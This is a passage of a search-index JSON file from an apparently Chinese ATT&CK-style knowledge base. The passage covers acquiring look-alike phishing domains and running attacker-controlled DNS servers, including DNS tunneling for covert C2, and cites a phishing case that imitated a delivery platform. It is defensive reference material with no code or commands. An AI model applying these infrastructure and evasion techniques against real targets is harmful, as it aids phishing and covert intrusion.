\u4f01\u4e1a\u53ef\u80fd\u6545\u610f\u6ce8\u518c\u4e0e\u4ed6\u4eec\u81ea\u5df1\u7684\u57df\u540d\u76f8\u4f3c\u7684\u57df\u540d\uff0c\u4ee5\u963b\u6b62\u653b\u51fb\u8005\u521b\u5efa\u9519\u522b\u5b57\u57df\u540d\u3002\u8fd9\u79cd\u6280\u672f\u7684\u5176\u4ed6\u65b9\u9762\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u6839\u636e\u8bbe\u8ba1\uff0c\u57df\u540d\u6ce8\u518c\u4fe1\u606f\u4f1a\u88ab\u8bb0\u5f55\u5728\u516c\u5171\u6ce8\u518c\u65e5\u5fd7\u4e2d\u3002\u8003\u8651\u4f7f\u7528\u53ef\u80fd\u6709\u52a9\u4e8e\u8ddf\u8e2a\u65b0\u83b7\u5f97\u7684\u57df\u540d\u7684\u670d\u52a1\uff0c\u5982WHOIS\u6570\u636e\u5e93\u6216\u88ab\u52a8DNS\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6709\u53ef\u80fd\u901a\u8fc7\u5df2\u77e5\u7684\u57df\u540d\u6ce8\u518c\u4fe1\u606f\u6765\u53d1\u73b0\u653b\u51fb\u8005\u8d2d\u4e70\u7684\u5176\u4ed6\u57fa\u7840\u8bbe\u65bd\u3002\u8003\u8651\u76d1\u6d4b\u4e0e\u4f60\u81ea\u5df1\u7684\u57df\u540d\u7ed3\u6784\u76f8\u4f3c\u7684\u57df\u540d\uff0c\u5305\u62ec\u5728\u4e0d\u540c\u7684\u9876\u7ea7\u57df\u540d\u4e0b\u521b\u5efa\u7684\u57df\u540d\u3002\u5c3d\u7ba1\u5b58\u5728\u5404\u79cd\u5de5\u5177\u548c\u670d\u52a1\u6765\u8ddf\u8e2a\u3001\u67e5\u8be2\u548c\u76d1\u6d4b\u57df\u540d\u6ce8\u518c\u4fe1\u606f\uff0c\u4f46\u8ddf\u8e2a\u591a\u4e2aDNS\u57fa\u7840\u8bbe\u65bd\u53ef\u80fd\u9700\u8981\u591a\u79cd\u5de5\u5177\u3001\u670d\u52a1\u6216\u66f4\u9ad8\u7ea7\u7684\u5206\u6790\u65b9\u6cd5\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u521d\u59cb\u8bbf\u95ee\u548c\u6307\u6325\u4e0e\u63a7\u5236\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1583-001 https://attack.mitre.org/techniques/T1583/001/ \u4e0d\u6cd5\u5206\u5b50\u9ad8\u4eff\u67d0\u5916\u5356\u5e73\u53f0\u7f51\u7ad9\uff0c\u5165\u9a7b\u5546\u6237\u906d\u9047\u201c\u9493\u9c7c\u653b\u51fb\u201d https://www.sohu.com/a/452671903_648183","title":"T1583-001-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u57df\u540d"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#t1583-001-","text":"","title":"T1583-001-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u57df\u540d"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u53ef\u5728\u5bf9\u76ee\u6807\u8fdb\u884c\u653b\u51fb\u4e2d\u4f7f\u7528\u7684\u57df\u540d\u3002\u57df\u540d\u662f\u7528\u4e8e\u4ee3\u8868\u4e00\u4e2a\u6216\u591a\u4e2aIP\u5730\u5740\u7684\u53ef\u8bfb\u540d\u79f0\u3002\u5b83\u4eec\u53ef\u4ee5\u88ab\u8d2d\u4e70\uff0c\u6216\u8005\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u514d\u8d39\u83b7\u5f97\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u8d2d\u4e70\u7684\u57df\u540d\u7528\u4e8e\u5404\u79cd\u76ee\u7684\uff0c\u5305\u62ec\u7f51\u7edc\u9493\u9c7c\u3001\u975e\u6cd5\u5165\u4fb5\u4ee5\u53ca\u547d\u4ee4\u548c\u63a7\u5236\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u4e0e\u5408\u6cd5\u57df\u540d\u76f8\u4f3c\u7684\u57df\u540d\uff0c\u5305\u62ec\u901a\u8fc7\u4f7f\u7528\u540c\u97f3\u5b57\u6216\u4f7f\u7528\u4e0d\u540c\u7684\u9876\u7ea7\u57df\u540d\uff08TLD\uff09\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528\u56fd\u9645\u5316\u57df\u540d\uff08IDN\uff09\u6765\u521b\u5efa\u89c6\u89c9\u4e0a\u76f8\u4f3c\u7684\u57df\u540d\uff0c\u4ee5\u4fbf\u5728\u884c\u52a8\u4e2d\u4f7f\u7528\u3002 \u57df\u540d\u6ce8\u518c\u5546\u90fd\u6709\u4e00\u4e2a\u53ef\u516c\u5f00\u67e5\u770b\u7684\u6570\u636e\u5e93\uff0c\u663e\u793a\u6bcf\u4e2a\u6ce8\u518c\u57df\u540d\u7684\u8054\u7cfb\u4fe1\u606f\u3002WHOIS\u670d\u52a1\u663e\u793a\u79c1\u4eba\u5176\u4ed6\u4fe1\u606f\uff0c\u5982\u4ed6\u4eec\u81ea\u5df1\u7684\u516c\u53f8\u6570\u636e\uff0c\u800c\u4e0d\u662f\u57df\u540d\u7684\u6240\u6709\u8005\u3002\u653b\u51fb\u8005\u53ef\u80fd\u5229\u7528\u8fd9\u79cd\u79c1\u4ebaWHOIS\u670d\u52a1\u6765\u63a9\u76d6\u5173\u4e8e\u8c01\u62e5\u6709\u6240\u8d2d\u57df\u540d\u7684\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u4f7f\u7528\u4e0d\u540c\u7684\u6ce8\u518c\u4fe1\u606f\u3001\u5728\u4e0d\u540c\u7684\u57df\u540d\u6ce8\u518c\u5546\u5904\u8d2d\u4e70\u57df\u540d\uff0c\u8fdb\u4e00\u6b65\u5e72\u6270\u8ffd\u8e2a\u5176\u57fa\u7840\u8bbe\u65bd\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_1","text":"\u65b0\u95fb\u7b80\u4ecb\uff1a\u4e0d\u6cd5\u5206\u5b50\u642d\u5efa\u4e86\u67d0\u77e5\u540d\u5916\u5356\u5e73\u53f0\u7684\u9493\u9c7c\u7f51\u7ad9\uff08www.meituam.cn\uff09\uff0c\u901a\u8fc7\u53d1\u9001\u77ed\u4fe1\u8bc8\u9a97\u8be5\u5e73\u53f0\u5165\u9a7b\u5546\u6237\u8fdb\u884c\u4e2a\u4eba\u4fe1\u606f\u5f55\u5165\u53ca\u7f34\u8d39\u3002\u8be5\u56e2\u4f19\u81ea2020\u5e74\u4ee5\u6765\uff0c\u4ee5\u6728\u9a6c\u77ed\u4fe1\u94fe\u63a5\u7684\u65b9\u5f0f\u4f5c\u684850\u4f59\u8d77\uff0c\u6d89\u6848\u8d44\u91d180\u4f59\u4e07\u5143\uff0c\u53d1\u6848\u5730\u6d89\u53ca\u5168\u56fd21\u4e2a\u7701\u4efd\u3002 https://www.sohu.com/a/452671903_648183 \u540c\u6837\u5728\u67d0\u4e9b\u7535\u5546\u5e73\u53f0\uff0c\u90e8\u5206\u53f7\u79f0\u80fd\u591f\u7834\u89e3apple\u5bc6\u7801\u7684\u5546\u5bb6\uff0c\u6240\u8c13\u7684\u8f6f\u89e3\u5bc6\uff0c\u4e5f\u662f\u7528\u7684\u76f8\u540c\u624b\u6cd5\uff0c\u4f2a\u9020\u548capple\u76f8\u4f3c\u57df\u540d\uff0c\u53d1\u9001\u9493\u9c7c\u94fe\u63a5\u7ed9\u6307\u5b9a\u7684\u7528\u6237\uff0c\u8bf1\u4f7f\u7528\u6237\u70b9\u51fb\u8fdb\u5165\u4f2a\u9020\u7ad9\u70b9\uff0c\u8f93\u5165\u8d26\u6237\u53ca\u5bc6\u7801\u3002\u4ece\u800c\u5b9e\u73b0\u8f6f\u89e3\u5bc6\u7684\u6548\u679c\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_7","text":"\u4f01\u4e1a\u53ef\u80fd\u6545\u610f\u6ce8\u518c\u4e0e\u4ed6\u4eec\u81ea\u5df1\u7684\u57df\u540d\u76f8\u4f3c\u7684\u57df\u540d\uff0c\u4ee5\u963b\u6b62\u653b\u51fb\u8005\u521b\u5efa\u9519\u522b\u5b57\u57df\u540d\u3002\u8fd9\u79cd\u6280\u672f\u7684\u5176\u4ed6\u65b9\u9762\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_8","text":"\u6839\u636e\u8bbe\u8ba1\uff0c\u57df\u540d\u6ce8\u518c\u4fe1\u606f\u4f1a\u88ab\u8bb0\u5f55\u5728\u516c\u5171\u6ce8\u518c\u65e5\u5fd7\u4e2d\u3002\u8003\u8651\u4f7f\u7528\u53ef\u80fd\u6709\u52a9\u4e8e\u8ddf\u8e2a\u65b0\u83b7\u5f97\u7684\u57df\u540d\u7684\u670d\u52a1\uff0c\u5982WHOIS\u6570\u636e\u5e93\u6216\u88ab\u52a8DNS\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6709\u53ef\u80fd\u901a\u8fc7\u5df2\u77e5\u7684\u57df\u540d\u6ce8\u518c\u4fe1\u606f\u6765\u53d1\u73b0\u653b\u51fb\u8005\u8d2d\u4e70\u7684\u5176\u4ed6\u57fa\u7840\u8bbe\u65bd\u3002\u8003\u8651\u76d1\u6d4b\u4e0e\u4f60\u81ea\u5df1\u7684\u57df\u540d\u7ed3\u6784\u76f8\u4f3c\u7684\u57df\u540d\uff0c\u5305\u62ec\u5728\u4e0d\u540c\u7684\u9876\u7ea7\u57df\u540d\u4e0b\u521b\u5efa\u7684\u57df\u540d\u3002\u5c3d\u7ba1\u5b58\u5728\u5404\u79cd\u5de5\u5177\u548c\u670d\u52a1\u6765\u8ddf\u8e2a\u3001\u67e5\u8be2\u548c\u76d1\u6d4b\u57df\u540d\u6ce8\u518c\u4fe1\u606f\uff0c\u4f46\u8ddf\u8e2a\u591a\u4e2aDNS\u57fa\u7840\u8bbe\u65bd\u53ef\u80fd\u9700\u8981\u591a\u79cd\u5de5\u5177\u3001\u670d\u52a1\u6216\u66f4\u9ad8\u7ea7\u7684\u5206\u6790\u65b9\u6cd5\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u521d\u59cb\u8bbf\u95ee\u548c\u6307\u6325\u4e0e\u63a7\u5236\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_9","text":"MITRE-ATT&CK-T1583-001 https://attack.mitre.org/techniques/T1583/001/ \u4e0d\u6cd5\u5206\u5b50\u9ad8\u4eff\u67d0\u5916\u5356\u5e73\u53f0\u7f51\u7ad9\uff0c\u5165\u9a7b\u5546\u6237\u906d\u9047\u201c\u9493\u9c7c\u653b\u51fb\u201d https://www.sohu.com/a/452671903_648183","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/","text":"T1583-002-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-DNS\u670d\u52a1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5efa\u7acb\u4ed6\u4eec\u81ea\u5df1\u7684\u57df\u540d\u7cfb\u7edf\uff08DNS\uff09\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u3002\u5728\u7834\u574f\u540e\u7684\u6d3b\u52a8\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528DNS\u6d41\u91cf\u8fdb\u884c\u5404\u79cd\u4efb\u52a1\uff0c\u5305\u62ec\u6307\u6325\u548c\u63a7\u5236\uff08\u4f8b\u5982\uff1a\u5e94\u7528\u5c42\u534f\u8bae\uff09\u3002\u4e0e\u5176\u52ab\u6301\u73b0\u6709\u7684DNS\u670d\u52a1\u5668\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u9009\u62e9\u914d\u7f6e\u548c\u8fd0\u884c\u81ea\u5df1\u7684DNS\u670d\u52a1\u5668\u6765\u652f\u6301\u6e17\u900f\u884c\u52a8\u3002 \u901a\u8fc7\u8fd0\u884c\u81ea\u5df1\u7684DNS\u670d\u52a1\u5668\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u66f4\u591a\u5730\u63a7\u5236\u4ed6\u4eec\u5982\u4f55\u7ba1\u7406\u670d\u52a1\u5668\u7aef\u7684DNS C2\u6d41\u91cf\u3002\u901a\u8fc7\u5bf9DNS\u670d\u52a1\u5668\u7684\u63a7\u5236\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u914d\u7f6eDNS\u5e94\u7528\u7a0b\u5e8f\uff0c\u4e3a\u6076\u610f\u8f6f\u4ef6\u63d0\u4f9b\u6709\u6761\u4ef6\u7684\u54cd\u5e94\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u5728\u57fa\u4e8eDNS\u7684C2\u901a\u9053\u7684\u7ed3\u6784\u4e0a\u6709\u66f4\u5927\u7684\u7075\u6d3b\u6027\u3002 \u6d4b\u8bd5\u6848\u4f8b DNS Tunneling DNS Tunneling\u662f\u9690\u853d\u901a\u9053\u7684\u4e00\u79cd\uff0c\u901a\u8fc7\u5c06\u5176\u4ed6\u534f\u8bae\u5c01\u88c5\u5728DNS\u534f\u8bae\u4e2d\u4f20\u8f93\u3002\u56e0\u4e3a\u5728\u4e92\u8054\u7f51\u4e2dDNS\u662f\u4e00\u4e2a\u5fc5\u4e0d\u53ef\u5c11\u7684\u670d\u52a1\uff0c\u6240\u4ee5\u5927\u90e8\u5206\u9632\u706b\u5899\u548c\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\u5f88\u5c11\u4f1a\u5bf9DNS\u6d41\u91cf\u8fdb\u884c\u8fc7\u6ee4\uff0c\u7531\u6b64DNS\u4f5c\u4e3a\u9690\u853d\u4fe1\u9053\u6709\u5929\u751f\u4f18\u52bf\u3002 \u539f\u7406 DNS Tunneling\u53ef\u4ee5\u5206\u4e3a\u76f4\u8fde\u548c\u4e2d\u7ee7\u4e24\u79cd\u3002 \u76f4\u8fde\uff1aclient\u76f4\u63a5\u548c\u6307\u5b9a\u7684\u76ee\u6807DNS Server(Authoritative NS Server)\u8fde\u63a5\uff0c\u901a\u8fc7\u5c06\u6570\u636e\u7f16\u7801\u5c01\u88c5\u5728DNS\u534f\u8bae\u4e2d\u8fdb\u884c\u901a\u4fe1\u3002\u8fd9\u79cd\u65b9\u5f0f\u901f\u5ea6\u5feb\uff0c\u4f46\u662f\u9690\u853d\u6027\u8f83\u5f31\uff0c\u5bb9\u6613\u88ab\u63a2\u6d4b\u5230\uff0c\u4e14\u5b58\u5728\u7684\u9650\u5236\u6bd4\u8f83\u591a\uff0c\u5f88\u591a\u573a\u666f\u4e0d\u5141\u8bb8\u81ea\u5df1\u6307\u5b9aDNS Server\u3002 \u4e2d\u7ee7\uff1a\u901a\u8fc7\u8fed\u4ee3DNS\u67e5\u8be2\u53ef\u4ee5\u5b9e\u73b0\u4e2d\u7ee7\u901a\u9053\uff0c\u66f4\u4e3a\u9690\u853d\uff0c\u4f46\u540c\u65f6\u56e0\u4e3a\u6570\u636e\u5305\u5230\u8fbe\u76ee\u6807DNS Server\u524d\u9700\u8981\u7ecf\u8fc7\u591a\u4e2a\u8282\u70b9\uff0c\u6240\u4ee5\u901f\u5ea6\u4e0a\u8f83\u6162\uff0c\u4f46\u662f\u53ef\u4ee5\u7a81\u7834\u9632\u706b\u5899\u7b49\u7684\u9650\u5236\u3002 DNS\u96a7\u9053\u5de5\u5177 \u4f7f\u7528DNS over HTTPS\uff08DoH\uff09\u6784\u5efa\u5f39\u6027C2\u57fa\u7840\u67b6\u6784\uff1a https://xz.aliyun.com/t/3068 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1583-002 https://attack.mitre.org/techniques/T1583/002/ \u4f7f\u7528DNS over HTTPS\uff08DoH\uff09\u6784\u5efa\u5f39\u6027C2\u57fa\u7840\u67b6\u6784 https://xz.aliyun.com/t/3068","title":"T1583-002-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-DNS\u670d\u52a1"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#t1583-002-dns","text":"","title":"T1583-002-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-DNS\u670d\u52a1"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5efa\u7acb\u4ed6\u4eec\u81ea\u5df1\u7684\u57df\u540d\u7cfb\u7edf\uff08DNS\uff09\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u3002\u5728\u7834\u574f\u540e\u7684\u6d3b\u52a8\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528DNS\u6d41\u91cf\u8fdb\u884c\u5404\u79cd\u4efb\u52a1\uff0c\u5305\u62ec\u6307\u6325\u548c\u63a7\u5236\uff08\u4f8b\u5982\uff1a\u5e94\u7528\u5c42\u534f\u8bae\uff09\u3002\u4e0e\u5176\u52ab\u6301\u73b0\u6709\u7684DNS\u670d\u52a1\u5668\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u9009\u62e9\u914d\u7f6e\u548c\u8fd0\u884c\u81ea\u5df1\u7684DNS\u670d\u52a1\u5668\u6765\u652f\u6301\u6e17\u900f\u884c\u52a8\u3002 \u901a\u8fc7\u8fd0\u884c\u81ea\u5df1\u7684DNS\u670d\u52a1\u5668\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u66f4\u591a\u5730\u63a7\u5236\u4ed6\u4eec\u5982\u4f55\u7ba1\u7406\u670d\u52a1\u5668\u7aef\u7684DNS C2\u6d41\u91cf\u3002\u901a\u8fc7\u5bf9DNS\u670d\u52a1\u5668\u7684\u63a7\u5236\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u914d\u7f6eDNS\u5e94\u7528\u7a0b\u5e8f\uff0c\u4e3a\u6076\u610f\u8f6f\u4ef6\u63d0\u4f9b\u6709\u6761\u4ef6\u7684\u54cd\u5e94\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u5728\u57fa\u4e8eDNS\u7684C2\u901a\u9053\u7684\u7ed3\u6784\u4e0a\u6709\u66f4\u5927\u7684\u7075\u6d3b\u6027\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_1","text":"","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#dns-tunneling","text":"DNS Tunneling\u662f\u9690\u853d\u901a\u9053\u7684\u4e00\u79cd\uff0c\u901a\u8fc7\u5c06\u5176\u4ed6\u534f\u8bae\u5c01\u88c5\u5728DNS\u534f\u8bae\u4e2d\u4f20\u8f93\u3002\u56e0\u4e3a\u5728\u4e92\u8054\u7f51\u4e2dDNS\u662f\u4e00\u4e2a\u5fc5\u4e0d\u53ef\u5c11\u7684\u670d\u52a1\uff0c\u6240\u4ee5\u5927\u90e8\u5206\u9632\u706b\u5899\u548c\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\u5f88\u5c11\u4f1a\u5bf9DNS\u6d41\u91cf\u8fdb\u884c\u8fc7\u6ee4\uff0c\u7531\u6b64DNS\u4f5c\u4e3a\u9690\u853d\u4fe1\u9053\u6709\u5929\u751f\u4f18\u52bf\u3002","title":"DNS Tunneling"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_2","text":"DNS Tunneling\u53ef\u4ee5\u5206\u4e3a\u76f4\u8fde\u548c\u4e2d\u7ee7\u4e24\u79cd\u3002 \u76f4\u8fde\uff1aclient\u76f4\u63a5\u548c\u6307\u5b9a\u7684\u76ee\u6807DNS Server(Authoritative NS Server)\u8fde\u63a5\uff0c\u901a\u8fc7\u5c06\u6570\u636e\u7f16\u7801\u5c01\u88c5\u5728DNS\u534f\u8bae\u4e2d\u8fdb\u884c\u901a\u4fe1\u3002\u8fd9\u79cd\u65b9\u5f0f\u901f\u5ea6\u5feb\uff0c\u4f46\u662f\u9690\u853d\u6027\u8f83\u5f31\uff0c\u5bb9\u6613\u88ab\u63a2\u6d4b\u5230\uff0c\u4e14\u5b58\u5728\u7684\u9650\u5236\u6bd4\u8f83\u591a\uff0c\u5f88\u591a\u573a\u666f\u4e0d\u5141\u8bb8\u81ea\u5df1\u6307\u5b9aDNS Server\u3002 \u4e2d\u7ee7\uff1a\u901a\u8fc7\u8fed\u4ee3DNS\u67e5\u8be2\u53ef\u4ee5\u5b9e\u73b0\u4e2d\u7ee7\u901a\u9053\uff0c\u66f4\u4e3a\u9690\u853d\uff0c\u4f46\u540c\u65f6\u56e0\u4e3a\u6570\u636e\u5305\u5230\u8fbe\u76ee\u6807DNS Server\u524d\u9700\u8981\u7ecf\u8fc7\u591a\u4e2a\u8282\u70b9\uff0c\u6240\u4ee5\u901f\u5ea6\u4e0a\u8f83\u6162\uff0c\u4f46\u662f\u53ef\u4ee5\u7a81\u7834\u9632\u706b\u5899\u7b49\u7684\u9650\u5236\u3002","title":"\u539f\u7406"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#dns","text":"\u4f7f\u7528DNS over HTTPS\uff08DoH\uff09\u6784\u5efa\u5f39\u6027C2\u57fa\u7840\u67b6\u6784\uff1a https://xz.aliyun.com/t/3068","title":"DNS\u96a7\u9053\u5de5\u5177"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_3","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_5","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_6","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5